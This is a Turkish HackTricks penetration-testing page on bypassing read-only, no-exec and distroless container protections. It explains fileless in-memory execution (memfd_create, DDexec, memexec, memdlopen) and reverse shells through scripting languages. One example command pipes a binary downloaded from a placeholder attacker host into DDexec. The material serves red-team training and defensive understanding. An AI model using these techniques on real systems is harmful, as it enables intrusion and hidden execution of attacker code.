# FS korumalarını aşma: yalnızca okunur / çalıştırılamaz / Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Videolar

Aşağıdaki videolarda bu sayfada bahsedilen tekniklerin daha derinlemesine açıklamalarını bulabilirsiniz:

- [**DEF CON 31 - Linux Bellek Manipülasyonunu Gizlilik ve Kaçış için Keşfetmek**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**DDexec-ng ile Gizli Sızmalar & Bellek İçi dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## yalnızca okunur / çalıştırılamaz senaryosu

Linux makinelerinin **yalnızca okunur (ro) dosya sistemi koruması** ile monte edilmesi giderek daha yaygın hale geliyor, özellikle konteynerlerde. Bunun nedeni, bir konteyneri ro dosya sistemi ile çalıştırmanın **`readOnlyRootFilesystem: true`** ayarını `securitycontext` içinde belirlemek kadar kolay olmasıdır:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Ancak, dosya sistemi ro olarak monte edilse bile, **`/dev/shm`** hala yazılabilir olacak, bu nedenle diske hiçbir şey yazamayacağımız yalan. Ancak, bu klasör **çalıştırılamaz koruması ile monte edilecektir**, bu nedenle burada bir ikili dosya indirirseniz **onu çalıştıramayacaksınız**.

> [!WARNING]
> Kırmızı takım perspektifinden, bu, sistemde zaten bulunmayan ikili dosyaları **indirmek ve çalıştırmak için karmaşık hale getiriyor** (örneğin, arka kapılar veya `kubectl` gibi enumeratörler).

## En Kolay Aşma: Scriptler

İkili dosyalardan bahsettiğimi unutmayın, eğer yorumlayıcı makine içinde mevcutsa, **herhangi bir scripti** çalıştırabilirsiniz, örneğin **shell script** eğer `sh` mevcutsa veya **python** **script** eğer `python` yüklüyse.

Ancak, bu yalnızca ikili arka kapınızı veya çalıştırmanız gereken diğer ikili araçları çalıştırmak için yeterli değildir.

## Bellek Aşmaları

Bir ikili dosyayı çalıştırmak istiyorsanız ancak dosya sistemi buna izin vermiyorsa, bunu yapmanın en iyi yolu **bellekten çalıştırmaktır**, çünkü **korumalar burada geçerli değildir**.

### FD + exec syscall aşması

Makine içinde **Python**, **Perl** veya **Ruby** gibi güçlü script motorlarınız varsa, ikili dosyayı bellekte çalıştırmak için indirebilir, bir bellek dosya tanımlayıcısında (`create_memfd` syscall) saklayabilir, bu korumalardan etkilenmeyecek ve ardından **`exec` syscall** çağrısı yaparak **fd'yi çalıştırılacak dosya olarak belirtebilirsiniz**.

Bunun için [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) projesini kolayca kullanabilirsiniz. Bir ikili dosya geçirebilir ve belirtilen dilde, **ikili dosya sıkıştırılmış ve b64 kodlanmış** olarak, `create_memfd` syscall çağrısı ile oluşturulan bir **fd** içinde **çözme ve açma** talimatları ile bir script oluşturacaktır.

> [!WARNING]
> Bu, PHP veya Node gibi diğer script dillerinde çalışmaz çünkü bunların scriptten ham syscall'leri çağırmak için herhangi bir **varsayılan yolu yoktur**, bu nedenle ikili dosyayı saklamak için **bellek fd'si** oluşturmak için `create_memfd` çağrısı yapmak mümkün değildir.
>
> Ayrıca, `/dev/shm` içinde bir dosya ile **normal bir fd** oluşturmak işe yaramayacaktır, çünkü **çalıştırılamaz koruma** uygulanacağı için bunu çalıştırmanıza izin verilmeyecektir.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) tekniği, **kendi sürecinizin belleğini** değiştirerek **`/proc/self/mem`** dosyasını yazmanızı sağlar.

Bu nedenle, sürecin yürüttüğü **montaj kodunu kontrol ederek**, bir **shellcode** yazabilir ve süreci **herhangi bir keyfi kodu çalıştıracak şekilde "mutasyona" uğratabilirsiniz**.

> [!TIP]
> **DDexec / EverythingExec**, kendi **shellcode'unuzu** veya **herhangi bir ikili dosyayı** **bellekten** yükleyip **çalıştırmanıza** olanak tanır.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Daha fazla bilgi için bu tekniği Github'da kontrol edin veya:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec), DDexec'in doğal bir sonraki adımıdır. Bu, **DDexec shellcode demonized** olduğu için, her seferinde **farklı bir ikili dosya çalıştırmak istediğinizde** DDexec'i yeniden başlatmanıza gerek yoktur, sadece memexec shellcode'u DDexec tekniği aracılığıyla çalıştırabilir ve ardından **yeni ikili dosyaları yüklemek ve çalıştırmak için bu demon ile iletişim kurabilirsiniz**.

**Memexec'i bir PHP ters shell'den ikili dosyaları çalıştırmak için nasıl kullanacağınızla ilgili bir örneği** [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) adresinde bulabilirsiniz.

### Memdlopen

DDexec ile benzer bir amaca sahip olan [**memdlopen**](https://github.com/arget13/memdlopen) tekniği, **ikili dosyaları** belleğe yüklemenin daha **kolay bir yolunu** sağlar ve daha sonra bunları çalıştırmanıza olanak tanır. Hatta bağımlılıkları olan ikili dosyaları yüklemenize bile izin verebilir.

## Distroless Bypass

### Distroless nedir

Distroless konteynerler, belirli bir uygulama veya hizmeti çalıştırmak için gerekli olan **en az gerekli bileşenleri** içerir; bu, kütüphaneler ve çalışma zamanı bağımlılıkları gibi bileşenleri içerir, ancak bir paket yöneticisi, shell veya sistem yardımcı programları gibi daha büyük bileşenleri hariç tutar.

Distroless konteynerlerin amacı, **gereksiz bileşenleri ortadan kaldırarak konteynerlerin saldırı yüzeyini azaltmak** ve istismar edilebilecek zafiyet sayısını en aza indirmektir.

### Ters Shell

Distroless bir konteynerde **normal bir shell almak için `sh` veya `bash`** bile bulamayabilirsiniz. Ayrıca `ls`, `whoami`, `id` gibi ikili dosyaları da bulamayacaksınız... genellikle bir sistemde çalıştırdığınız her şey.

> [!WARNING]
> Bu nedenle, **ters bir shell** almanız veya sistemi **numaralandırmanız** mümkün **olmayacaktır**.

Ancak, eğer ele geçirilmiş konteyner örneğin bir flask web uygulaması çalıştırıyorsa, o zaman python yüklüdür ve bu nedenle bir **Python ters shell** alabilirsiniz. Eğer node çalıştırıyorsa, bir Node rev shell alabilirsiniz ve çoğu **betik dili** ile aynı durum geçerlidir.

> [!TIP]
> Betik dilini kullanarak, dilin yeteneklerini kullanarak **sistemi numaralandırabilirsiniz**.

Eğer **`read-only/no-exec`** korumaları yoksa, ters shell'inizi kullanarak **dosya sistemine ikili dosyalarınızı yazabilir** ve **çalıştırabilirsiniz**.

> [!TIP]
> Ancak, bu tür konteynerlerde bu korumalar genellikle mevcut olacaktır, ancak **önceki bellek yürütme tekniklerini bunları aşmak için kullanabilirsiniz**.

**Bazı RCE zafiyetlerini istismar ederek betik dillerinden **ters shell'ler** almak ve bellekte ikili dosyaları çalıştırmak için **örnekleri** [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) adresinde bulabilirsiniz.

{{#include ../../../banners/hacktricks-training.md}}
